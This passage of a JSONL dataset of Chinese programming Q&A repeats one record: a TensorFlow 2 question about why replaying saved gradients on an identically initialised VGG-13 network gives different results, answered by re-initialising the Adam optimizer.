qaP4cnqoAXvTuMv1zU1Iz3han3MQyD3CjAVd0BM5D0m/\n", "''", " SIG ", "''", " ", "OsomA1SK4FAVM6qaPsD444jVIVzPRNP0b5Kc0P8ER6Q", "/\n", "''", " SIG ", "''", " HZvKs+BJqvWmPixPXGt6+KA=\n", "''", " SIG ", "''", " End signature block\n\n\n"]], "Tag": "算法设计"}
{"Answer": "&lt;p&gt;在上面给的代码的第164行处插入&lt;/p&gt;\n\n&lt;pre&gt;\n&lt;code class=\"language-python\"&gt;optimizer &amp;#61; optimizers.Adam(lr&amp;#61;1e-4)&lt;/code&gt;&lt;/pre&gt;\n\n&lt;p&gt;重新初始化optimizer&amp;#xff0c;这样两个模型训练后的测试结果就一样了&amp;#xff0c;望采纳&lt;/p&gt;", "Konwledge_Point": "NP完全问题", "Question": ["tensorflow2.x 深度学习 使用相同梯度进行梯度下降的两个相同神经网络，得到的结果却不同", ["用深度神经网络进行训练时，将每个step计算出的梯度grad保存进一个list（见下方代码段第20行）", "\n\n", "\n", "for step, (x, y) in enumerate(train_db):\n    with tf.GradientTape() as tape:  # 构建梯度记录环境\n        # 插入通道维度，=>[b,32,32,1]\n        intermediate_out = conv_net(x, training=True)\n        intermediate_out = tf.reshape(intermediate_out, [-1, 512])\n        out = fc_net(intermediate_out, training=True)\n\n        # 真实标签 one-hot 编码，[b] => [b, 10]\n        y_one_hot = tf.one_hot(y, depth=10)\n        # 计算交叉熵损失函数，标量\n        loss = tf.losses.categorical_crossentropy(y_one_hot, out, from_logits=True)\n        loss = tf.reduce_mean(loss)\n\n    # 列表合并，合并 2 个子网络的参数\n    variables = conv_net.trainable_variables + fc_net.trainable_variables\n    # 对所有参数求梯度\n    grads = tape.gradient(loss, variables)\n    \n    # 将grads保存进一个list中\n    grad_list.append(grads)\n\n    optimizer.apply_gradients(zip(grads, variables))", "\n\n", "然后创建另一个一模一样的神经网络，并使用刚刚保存的grads-list中的每个grads依次对该神经网络进行梯度下降", "\n\n", "\n", "# 加载刚刚保存的相同的VGG-13网络，利用刚刚生成的grad进行梯度下降\nt_conv_net = models.load_model('conv_net0.h5', compile=False)\nt_fc_net = models.load_model('fc_net0.h5', compile=False)\n# 训练前测试一下模型准确率\nt_accuracy_before = run_test(t_conv_net, t_fc_net, test_db)\nprint(\"t_accuracy before train = \", t_accuracy_before)\n\nt_variables = t_conv_net.trainable_variables + t_fc_net.trainable_variables\n\nfor gg in grad_list:\n    optimizer.apply_gradients(zip(gg, t_variables))", "\n\n", "理论上经过这一轮训练，应该得到两个完全相同的训练后的模型，因为两个模型初始化相同，使用了相同的梯度grads进行梯度下降来训练它们的参数。然而结果却并非如此，第一个模型经过这一轮训练，测试准确率从0.11左右提升至了0.4左右；而第二个模型的测试准确率却几乎没有变化。", "\n\n", "\n\n", "请各位大佬指导一下，为什么使用相同的梯度进行梯度下降，却会得到不同的结果?万分感激！", "\n\n", "完整代码如下所示：", "\n\n", "\n", "import os\nimport numpy as np\nimport math\nimport tensorflow as tf  # 导入 TF 库\nfrom tensorflow.keras import layers, Sequential, losses, optimizers, datasets, models\nimport matplotlib.pyplot as plt\n\n# 设置 GPU 显存使用方式为：为增长式占用-----------------------\ngpus = tf.config.experimental.list_physical_devices('GPU')\nif gpus:\n    try:  # 设置 GPU 为增长式占用\n        for gpu in gpus:\n            tf.config.experimental.set_memory_growth(gpu, True)\n    except RuntimeError as e:\n        # 打印异常\n        print(e)\n\nos.environ['TF_CPP_MIN_LOG_LEVEL'] = '2'\ntf.random.set_seed(2345)\n\n\ndef vgg13():\n    conv_layers = [\n        # 先创建包含多网络层的列表\n        # Conv-Conv-Pooling 单元 1\n        # 64 个 3x3 卷积核, 输入输出同大小\n        layers.Conv2D(64, kernel_size=[3, 3], padding=\"same\", activation=tf.nn.relu),\n        layers.Conv2D(64, kernel_size=[3, 3], padding=\"same\", activation=tf.nn.relu),\n        # 高宽减半\n        layers.MaxPool2D(pool_size=[2, 2], strides=2, padding='same'),\n\n        # Conv-Conv-Pooling 单元 2,输出通道提升至 128，高宽大小减半\n        layers.Conv2D(128, kernel_size=[3, 3], padding=\"same\", activation=tf.nn.relu),\n        layers.Conv2D(128, kernel_size=[3, 3], padding=\"same\", activation=tf.nn.relu),\n        layers.MaxPool2D(pool_size=[2, 2], strides=2, padding='same'),\n\n        # Conv-Conv-Pooling 单元 3,输出通道提升至 256，高宽大小减半\n        layers.Conv2D(256, kernel_size=[3, 3], padding=\"same\", activation=tf.nn.relu),\n        layers.Conv2D(256, kernel_size=[3, 3], padding=\"same\", activation=tf.nn.relu),\n        layers.MaxPool2D(pool_size=[2, 2], strides=2, padding='same'),\n\n        # Conv-Conv-Pooling 单元 4,输出通道提升至 512，高宽大小减半\n        layers.Conv2D(512, kernel_size=[3, 3], padding=\"same\", activation=tf.nn.relu),\n        layers.Conv2D(512, kernel_size=[3, 3], padding=\"same\", activation=tf.nn.relu),\n        layers.MaxPool2D(pool_size=[2, 2], strides=2, padding='same'),\n\n        # Conv-Conv-Pooling 单元 5,输出通道提升至 512，高宽大小减半\n        layers.Conv2D(512, kernel_size=[3, 3], padding=\"same\", activation=tf.nn.relu),\n        layers.Conv2D(512, kernel_size=[3, 3], padding=\"same\", activation=tf.nn.relu),\n        layers.MaxPool2D(pool_size=[2, 2], strides=2, padding='same')\n    ]\n\n    # 利用前面创建的层列表构建网络容器\n    conv_net = Sequential(conv_layers)\n\n    # 创建 3 层全连接层子网络\n    fc_net = Sequential([\n        layers.Dense(256, activation=tf.nn.relu),\n        layers.Dense(128, activation=tf.nn.relu),\n        layers.Dense(10, activation=None),\n    ])\n\n    # build2 个子网络，并打印网络参数信息\n    conv_net.build(input_shape=[None, 32, 32, 3])\n    fc_net.build(input_shape=[None, 512])\n\n    return conv_net, fc_net\n\n\ndef preprocess(x, y):\n    x = tf.cast(x, dtype=tf.float32) / 255.\n    y = tf.cast(y, dtype=tf.int32)  # 类型转换\n    return x, y\n\n\ndef generating_data_set(input_x, input_y, batch):\n    # 构建训练集对象，随机打乱，预处理，批量化\n    db = tf.data.Dataset.from_tensor_slices((input_x, input_y))\n    db = db.shuffle(1000).map(preprocess).batch(batch)  # 构建测试集对象，预处理，批量化\n    return db\n\n\ndef run_test(conv_net, fc_net, test_db):\n    # 记录预测正确的数量，总样本数量\n    correct_num, total_num = 0, 0\n    for x, y in test_db:  # 遍历所有训练集样本\n        # 插入通道维度，=>[b,28,28,1]\n        intermediate_out = conv_net(x, training=False)\n        intermediate_out = tf.reshape(intermediate_out, [-1, 512])\n        out = fc_net(intermediate_out, training=False)\n        # 先经过 softmax，再 argmax\n        prob = tf.nn.softmax(out, axis=1)\n        pred = tf.argmax(prob, axis=1)\n        pred = tf.cast(pred, dtype=tf.int32)\n\n        correct = tf.cast(tf.equal(pred, y), dtype=tf.int32)\n        correct = tf.reduce_sum(correct)\n        total_num += x.shape[0]\n        correct_num += int(correct)\n\n    # 计算准确率\n    accuracy = correct_num / total_num\n    return accuracy\n\n(x, y), (x_test, y_test) = datasets.cifar10.load_data()  # 数据集为cifar10\n# 删除 y 的一个维度，[b,1] => [b]\ny = tf.squeeze(y, axis=1)\ny_test = tf.squeeze(y_test, axis=1)\n\ntrain_db = generating_data_set(x, y, 128)\ntest_db = generating_data_set(x_test, y_test, 64)\n\ngrad_list = []  # 用于存储每个step产生的梯度grad\nconv_net, fc_net = vgg13()  # 使用的神经网络为VGG-13\noptimizer = optimizers.Adam(lr=1e-4)\n\n# 将神经网络保存\nconv_net.save('conv_net0.h5')\nfc_net.save('fc_net0.h5')\nprint(\"第一个模型：\")\n# 训练前测试一下模型准确率\naccuracy_before = run_test(conv_net, fc_net, test_db)\nprint(\"accuracy before train = \", accuracy_before)\n\nfor step, (x, y) in enumerate(train_db):\n    with tf.GradientTape() as tape:  # 构建梯度记录环境\n        # 插入通道维度，=>[b,32,32,1]\n        intermediate_out = conv_net(x, training=True)\n        intermediate_out = tf.reshape(intermediate_out, [-1, 512])\n        out = fc_net(intermediate_out, training=True)\n\n        # 真实标签 one-hot 编码，[b] => [b, 10]\n        y_one_hot = tf.one_hot(y, depth=10)\n        # 计算交叉熵损失函数，标量\n        loss = tf.losses.categorical_crossentropy(y_one_hot, out, from_logits=True)\n        loss = tf.reduce_mean(loss)\n\n    # 列表合并，合并 2 个子网络的参数\n    variables = conv_net.trainable_variables + fc_net.trainable_variables\n    # 对所有参数求梯度\n    grads = tape.gradient(loss, variables)\n\n    # 将grads保存进一个list中\n    grad_list.append(grads)\n\n    optimizer.apply_gradients(zip(grads, variables))\n\n# 训练后测试一下模型准确率\naccuracy_after = run_test(conv_net, fc_net, test_db)\nprint(\"accuracy after train = \", accuracy_after)\n\ndel conv_net\ndel fc_net\n\n# 加载刚刚保存的相同的VGG-13网络，利用刚刚生成的grad进行梯度下降\nt_conv_net = models.load_model('conv_net0.h5', compile=False)\nt_fc_net = models.load_model('fc_net0.h5', compile=False)\nprint(\"\\n第二个模型：\")\n# 训练前测试一下模型准确率\nt_accuracy_before = run_test(t_conv_net, t_fc_net, test_db)\nprint(\"t_accuracy before train = \", t_accuracy_before)\n\nt_variables = t_conv_net.trainable_variables + t_fc_net.trainable_variables\n\nfor gg in grad_list:\n    optimizer.apply_gradients(zip(gg, t_variables))\n\n# 训练后测试一下模型准确率\nt_accuracy_after = run_test(t_conv_net, t_fc_net, test_db)\nprint(\"t_accuracy after train = \", t_accuracy_after)\n"]], "Tag": "算法设计"}
{"Answer": "&lt;p&gt;在上面给的代码的第164行处插入&lt;/p&gt;\n\n&lt;pre&gt;\n&lt;code class=\"language-python\"&gt;optimizer &amp;#61; optimizers.Adam(lr&amp;#61;1e-4)&lt;/code&gt;&lt;/pre&gt;\n\n&lt;p&gt;重新初始化optimizer&amp;#xff0c;这样两个模型训练后的测试结果就一样了&amp;#xff0c;望采纳&lt;/p&gt;", "Konwledge_Point": "NP完全问题", "Question": ["tensorflow2.x 深度学习 使用相同梯度进行梯度下降的两个相同神经网络，得到的结果却不同", ["用深度神经网络进行训练时，将每个step计算出的梯度grad保存进一个list（见下方代码段第20行）", "\n\n", "\n", "for step, (x, y) in enumerate(train_db):\n    with tf.GradientTape() as tape:  # 构建梯度记录环境\n        # 插入通道维度，=>[b,32,32,1]\n        intermediate_out = conv_net(x, training=True)\n        intermediate_out = tf.reshape(intermediate_out, [-1, 512])\n        out = fc_net(intermediate_out, training=True)\n\n        # 真实标签 one-hot 编码，[b] => [b, 10]\n        y_one_hot = tf.one_hot(y, depth=10)\n        # 计算交叉熵损失函数，标量\n        loss = tf.losses.categorical_crossentropy(y_one_hot, out, from_logits=True)\n        loss = tf.reduce_mean(loss)\n\n    # 列表合并，合并 2 个子网络的参数\n    variables = conv_net.trainable_variables + fc_net.trainable_variables\n    # 对所有参数求梯度\n    grads = tape.gradient(loss, variables)\n    \n    # 将grads保存进一个list中\n    grad_list.append(grads)\n\n    optimizer.apply_gradients(zip(grads, variables))", "\n\n", "然后创建另一个一模一样的神经网络，并使用刚刚保存的grads-list中的每个grads依次对该神经网络进行梯度下降", "\n\n", "\n", "# 加载刚刚保存的相同的VGG-13网络，利用刚刚生成的grad进行梯度下降\nt_conv_net = models.load_model('conv_net0.h5', compile=False)\nt_fc_net = models.load_model('fc_net0.h5', compile=False)\n# 训练前测试一下模型准确率\nt_accuracy_before = run_test(t_conv_net, t_fc_net, test_db)\nprint(\"t_accuracy before train = \", t_accuracy_before)\n\nt_variables = t_conv_net.trainable_variables + t_fc_net.trainable_variables\n\nfor gg in grad_list:\n    optimizer.apply_gradients(zip(gg, t_variables))", "\n\n", "理论上经过这一轮训练，应该得到两个完全相同的训练后的模型，因为两个模型初始化相同，使用了相同的梯度grads进行梯度下降来训练它们的参数。然而结果却并非如此，第一个模型经过这一轮训练，测试准确率从0.11左右提升至了0.4左右；而第二个模型的测试准确率却几乎没有变化。", "\n\n", "\n\n", "请各位大佬指导一下，为什么使用相同的梯度进行梯度下降，却会得到不同的结果?万分感激！", "\n\n", "完整代码如下所示：", "\n\n", "\n", "import os\nimport numpy as np\nimport math\nimport tensorflow as tf  # 导入 TF 库\nfrom tensorflow.keras import layers, Sequential, losses, optimizers, datasets, models\nimport matplotlib.pyplot as plt\n\n# 设置 GPU 显存使用方式为：为增长式占用-----------------------\ngpus = tf.config.experimental.list_physical_devices('GPU')\nif gpus:\n    try:  # 设置 GPU 为增长式占用\n        for gpu in gpus:\n            tf.config.experimental.set_memory_growth(gpu, True)\n    except RuntimeError as e:\n        # 打印异常\n        print(e)\n\nos.environ['TF_CPP_MIN_LOG_LEVEL'] = '2'\ntf.random.set_seed(2345)\n\n\ndef vgg13():\n    conv_layers = [\n        # 先创建包含多网络层的列表\n        # Conv-Conv-Pooling 单元 1\n        # 64 个 3x3 卷积核, 输入输出同大小\n        layers.Conv2D(64, kernel_size=[3, 3], padding=\"same\", activation=tf.nn.relu),\n        layers.Conv2D(64, kernel_size=[3, 3], padding=\"same\", activation=tf.nn.relu),\n        # 高宽减半\n        layers.MaxPool2D(pool_size=[2, 2], strides=2, padding='same'),\n\n        # Conv-Conv-Pooling 单元 2,输出通道提升至 128，高宽大小减半\n        layers.Conv2D(128, kernel_size=[3, 3], padding=\"same\", activation=tf.nn.relu),\n        layers.Conv2D(128, kernel_size=[3, 3], padding=\"same\", activation=tf.nn.relu),\n        layers.MaxPool2D(pool_size=[2, 2], strides=2, padding='same'),\n\n        # Conv-Conv-Pooling 单元 3,输出通道提升至 256，高宽大小减半\n        layers.Conv2D(256, kernel_size=[3, 3], padding=\"same\", activation=tf.nn.relu),\n        layers.Conv2D(256, kernel_size=[3, 3], padding=\"same\", activation=tf.nn.relu),\n        layers.MaxPool2D(pool_size=[2, 2], strides=2, padding='same'),\n\n        # Conv-Conv-Pooling 单元 4,输出通道提升至 512，高宽大小减半\n        layers.Conv2D(512, kernel_size=[3, 3], padding=\"same\", activation=tf.nn.relu),\n        layers.Conv2D(512, kernel_size=[3, 3], padding=\"same\", activation=tf.nn.relu),\n        layers.MaxPool2D(pool_size=[2, 2], strides=2, padding='same'),\n\n        # Conv-Conv-Pooling 单元 5,输出通道提升至 512，高宽大小减半\n        layers.Conv2D(512, kernel_size=[3, 3], padding=\"same\", activation=tf.nn.relu),\n        layers.Conv2D(512, kernel_size=[3, 3], padding=\"same\", activation=tf.nn.relu),\n        layers.MaxPool2D(pool_size=[2, 2], strides=2, padding='same')\n    ]\n\n    # 利用前面创建的层列表构建网络容器\n    conv_net = Sequential(conv_layers)\n\n    # 创建 3 层全连接层子网络\n    fc_net = Sequential([\n        layers.Dense(256, activation=tf.nn.relu),\n        layers.Dense(128, activation=tf.nn.relu),\n        layers.Dense(10, activation=None),\n    ])\n\n    # build2 个子网络，并打印网络参数信息\n    conv_net.build(input_shape=[None, 32, 32, 3])\n    fc_net.build(input_shape=[None, 512])\n\n    return conv_net, fc_net\n\n\ndef preprocess(x, y):\n    x = tf.cast(x, dtype=tf.float32) / 255.\n    y = tf.cast(y, dtype=tf.int32)  # 类型转换\n    return x, y\n\n\ndef generating_data_set(input_x, input_y, batch):\n    # 构建训练集对象，随机打乱，预处理，批量化\n    db = tf.data.Dataset.from_tensor_slices((input_x, input_y))\n    db = db.shuffle(1000).map(preprocess).batch(batch)  # 构建测试集对象，预处理，批量化\n    return db\n\n\ndef run_test(conv_net, fc_net, test_db):\n    # 记录预测正确的数量，总样本数量\n    correct_num, total_num = 0, 0\n    for x, y in test_db:  # 遍历所有训练集样本\n        # 插入通道维度，=>[b,28,28,1]\n        intermediate_out = conv_net(x, training=False)\n        intermediate_out = tf.reshape(intermediate_out, [-1, 512])\n        out = fc_net(intermediate_out, training=False)\n        # 先经过 softmax，再 argmax\n        prob = tf.nn.softmax(out, axis=1)\n        pred = tf.argmax(prob, axis=1)\n        pred = tf.cast(pred, dtype=tf.int32)\n\n        correct = tf.cast(tf.equal(pred, y), dtype=tf.int32)\n        correct = tf.reduce_sum(correct)\n        total_num += x.shape[0]\n        correct_num += int(correct)\n\n    # 计算准确率\n    accuracy = correct_num / total_num\n    return accuracy\n\n(x, y), (x_test, y_test) = datasets.cifar10.load_data()  # 数据集为cifar10\n# 删除 y 的一个维度，[b,1] => [b]\ny = tf.squeeze(y, axis=1)\ny_test = tf.squeeze(y_test, axis=1)\n\ntrain_db = generating_data_set(x, y, 128)\ntest_db = generating_data_set(x_test, y_test, 64)\n\ngrad_list = []  # 用于存储每个step产生的梯度grad\nconv_net, fc_net = vgg13()  # 使用的神经网络为VGG-13\noptimizer = optimizers.Adam(lr=1e-4)\n\n# 将神经网络保存\nconv_net.save('conv_net0.h5')\nfc_net.save('fc_net0.h5')\nprint(\"第一个模型：\")\n# 训练前测试一下模型准确率\naccuracy_before = run_test(conv_net, fc_net, test_db)\nprint(\"accuracy before train = \", accuracy_before)\n\nfor step, (x, y) in enumerate(train_db):\n    with tf.GradientTape() as tape:  # 构建梯度记录环境\n        # 插入通道维度，=>[b,32,32,1]\n        intermediate_out = conv_net(x, training=True)\n        intermediate_out = tf.reshape(intermediate_out, [-1, 512])\n        out = fc_net(intermediate_out, training=True)\n\n        # 真实标签 one-hot 编码，[b] => [b, 10]\n        y_one_hot = tf.one_hot(y, depth=10)\n        # 计算交叉熵损失函数，标量\n        loss = tf.losses.categorical_crossentropy(y_one_hot, out, from_logits=True)\n        loss = tf.reduce_mean(loss)\n\n    # 列表合并，合并 2 个子网络的参数\n    variables = conv_net.trainable_variables + fc_net.trainable_variables\n    # 对所有参数求梯度\n    grads = tape.gradient(loss, variables)\n\n    # 将grads保存进一个list中\n    grad_list.append(grads)\n\n    optimizer.apply_gradients(zip(grads, variables))\n\n# 训练后测试一下模型准确率\naccuracy_after = run_test(conv_net, fc_net, test_db)\nprint(\"accuracy after train = \", accuracy_after)\n\ndel conv_net\ndel fc_net\n\n# 加载刚刚保存的相同的VGG-13网络，利用刚刚生成的grad进行梯度下降\nt_conv_net = models.load_model('conv_net0.h5', compile=False)\nt_fc_net = models.load_model('fc_net0.h5', compile=False)\nprint(\"\\n第二个模型：\")\n# 训练前测试一下模型准确率\nt_accuracy_before = run_test(t_conv_net, t_fc_net, test_db)\nprint(\"t_accuracy before train = \", t_accuracy_before)\n\nt_variables = t_conv_net.trainable_variables + t_fc_net.trainable_variables\n\nfor gg in grad_list:\n    optimizer.apply_gradients(zip(gg, t_variables))\n\n# 训练后测试一下模型准确率\nt_accuracy_after = run_test(t_conv_net, t_fc_net, test_db)\nprint(\"t_accuracy after train = \", t_accuracy_after)\n"]], "Tag": "算法设计"}
